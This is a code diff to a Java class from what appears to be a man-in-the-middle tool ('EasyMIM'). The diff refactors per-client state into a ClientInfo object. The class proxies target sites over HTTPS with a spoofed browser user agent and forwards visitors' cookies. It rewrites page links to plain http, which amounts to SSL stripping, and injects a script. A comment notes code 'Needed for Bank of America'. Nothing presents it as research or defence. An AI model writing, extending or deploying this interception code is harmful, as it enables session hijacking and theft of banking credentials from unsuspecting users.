@@ -23,33 +23,33 @@ import org.jsoup.nodes.Document.OutputSettings;
 import org.jsoup.nodes.Entities.EscapeMode;
 import org.jsoup.select.Elements;
 
+import Models.ClientInfo;
+
+import ui.EasyMIMConfig;
+
 public class WebsiteProcessor {
 	private final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36";
 	public enum Protocol{HTTP,HTTPS};
-	private List<String> cookies;
-	String base;
 	
-	public String getBase(){
-		return this.base;
+	public WebsiteProcessor() {
+		// TODO Auto-generated constructor stub
 	}
-	public void setBase(String base){
-		if(base!=null && base!=this.base){
-			this.base = base;
-		}
+	public WebsiteProcessor(EasyMIMConfig config) {
+		// TODO Auto-generated constructor stub
 	}
-	public void processRequest(HttpServletRequest request, HttpServletResponse response) throws IOException{
+	public void processRequest(HttpServletRequest request, HttpServletResponse response, ClientInfo ci) throws IOException{
 		String endPoint = request.getRequestURI();
-		setBase(request.getParameter("url"));
-		String url = getBase()+endPoint;
+		ci.setBase(request.getParameter("url"));
+		String url = ci.getBase()+endPoint;
 		String query = request.getQueryString();
 		if(query!=null && !query.equals("null")){
 			url+="?"+query;
 		}
-		String html = getRawResponseAndSetBasic(url,"GET",request,response);
-		String modifiedHtml = processHTML(url, html, url.contains(".js"));
+		String html = getRawResponseAndSetBasic(url,"GET",request,response,ci);
+		String modifiedHtml = processHTML(url, html, url.contains(".js"),ci);
 		response.getWriter().write(modifiedHtml);
 	}
-	public String processHTML(String url, String html,boolean isJS) throws MalformedURLException, IOException{
+	public String processHTML(String url, String html,boolean isJS,ClientInfo ci) throws MalformedURLException, IOException{
 		//downgrade all links to http
 		//Pattern p = Pattern.compile("https");
 		//Matcher m = p.matcher(html);
@@ -65,7 +65,7 @@ public class WebsiteProcessor {
 		doc.head().prepend("<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>");
 		Element iconHeader = doc.select("meta[itemprop]").first();
 		if(iconHeader!=null && iconHeader.attr("content")!=null){
-			doc.head().prepend("<link rel='shortcut icon' href='"+"http://"+getBase()+iconHeader.attr("content")+"'>");
+			doc.head().prepend("<link rel='shortcut icon' href='"+"http://"+ci.getBase()+iconHeader.attr("content")+"'>");
 		}
 		//downgrade all src href links to http
 		Elements links = doc.select("img");
@@ -74,7 +74,7 @@ public class WebsiteProcessor {
 		for(Element l:links){
 			String imgSrc = l.attr("src");
 			if(!imgSrc.contains("//")){
-				imgSrc = "http://"+getBase()+imgSrc;
+				imgSrc = "http://"+ci.getBase()+imgSrc;
 			}
 			l.attr("src", imgSrc);
 		}
@@ -85,7 +85,7 @@ public class WebsiteProcessor {
 			String dataF = boa.attr("data-fallback");
 			Pattern p = Pattern.compile("src=\"");
 			Matcher m = p.matcher(dataF);
-			dataF=m.replaceAll("src=\"http://"+getBase());
+			dataF=m.replaceAll("src=\"http://"+ci.getBase());
 			boa.append(dataF);
 		}
 		/*Needed for Bank of America*/
@@ -111,7 +111,7 @@ public class WebsiteProcessor {
 		}
 		return doc.toString();
 	}
-	public String getRawResponseAndSetBasic(String url,String method,HttpServletRequest request, HttpServletResponse response) throws IOException{
+	public String getRawResponseAndSetBasic(String url,String method,HttpServletRequest request, HttpServletResponse response,ClientInfo ci) throws IOException{
 		String link = "https://"+url;
 		URL u = new URL(link);
 		HttpURLConnection  conn = (HttpURLConnection) u.openConnection();
@@ -131,8 +131,8 @@ public class WebsiteProcessor {
 		conn.setRequestProperty("Accept",
 			"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 		conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
-		if (cookies != null) {
-			for (String cookie : this.cookies) {
+		if (ci.getCookies() != null) {
+			for (String cookie : ci.getCookies()) {
 				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
 			}
 		}
